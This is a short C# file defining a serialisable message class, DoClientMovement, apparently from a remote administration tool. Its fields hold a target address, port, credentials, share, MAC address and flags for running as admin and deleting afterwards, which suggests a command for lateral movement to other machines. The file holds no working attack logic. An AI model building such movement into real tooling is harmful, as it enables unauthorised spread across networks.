using ProtoBuf;
using System.Net;
using Pulsar.Common.Messages.other;

namespace Pulsar.Common.Messages.Network
{
    [ProtoContract]
    public class DoClientMovement : IMessage
    {
        [ProtoMember(1)]
        public IPAddress Address { get; set; }

        [ProtoMember(2)]
        public int Port { get; set; }

        [ProtoMember(3)]
        public string Username { get; set; }

        [ProtoMember(4)]
        public string Password { get; set; }

        [ProtoMember(5)]
        public string Share { get; set; }

        [ProtoMember(6)]
        public string MAC { get; set; }

        [ProtoMember(7)]
        public bool AsAdmin { get; set; }

        [ProtoMember(8)]
        public bool DeleteAfter { get; set; }
    }
}
